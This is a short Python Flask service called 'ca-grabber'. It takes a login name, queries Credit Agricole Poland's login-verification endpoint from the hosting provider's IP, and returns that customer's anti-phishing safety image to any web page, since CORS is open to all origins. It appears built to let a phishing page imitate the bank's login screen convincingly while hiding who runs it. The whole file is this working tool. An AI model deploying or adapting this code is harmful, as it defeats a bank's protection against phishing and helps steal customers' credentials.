from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
# Allow ALL origins — your HTML can call from anywhere
CORS(app, resources={
    r"/grab": {
        "origins": "*",
        "methods": ["POST", "OPTIONS"],
        "allow_headers": ["Content-Type"]
    },
    r"/health": {
        "origins": "*"
    }
})

CA_API = "https://ca24.credit-agricole.pl/web-ca24/resources/authentication/verifyUserNweb"

@app.route("/grab", methods=["POST", "OPTIONS"])
def grab():
    # Handle browser preflight
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200
    
    data = request.get_json()
    login = data.get("login")
    
    if not login:
        return jsonify({"error": "login required"}), 400
    
    payload = {
        "header": {"lang": "pl"},
        "login": login
    }
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        # Call Credit Agricole from RENDER'S IP — not yours!
        response = requests.post(
            CA_API,
            json=payload,
            headers=headers,
            timeout=15
        )
        
        ca_data = response.json()
        image_id = ca_data.get("safetyImage", {}).get("id")
        
        if not image_id:
            return jsonify({
                "error": "no safety image found",
                "raw_response": ca_data
            }), 404
        
        # Build image URL
        image_url = f"https://ca24.credit-agricole.pl/web-ca24/resources/authentication/safetyImage/{image_id}"
        
        return jsonify({
            "success": True,
            "imageId": image_id,
            "imageUrl": image_url
        })
        
    except requests.exceptions.Timeout:
        return jsonify({"error": "Credit Agricole timeout"}), 504
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"request failed: {str(e)}"}), 502
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "status": "alive",
        "service": "ca-grabber",
        "version": "1.0"
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
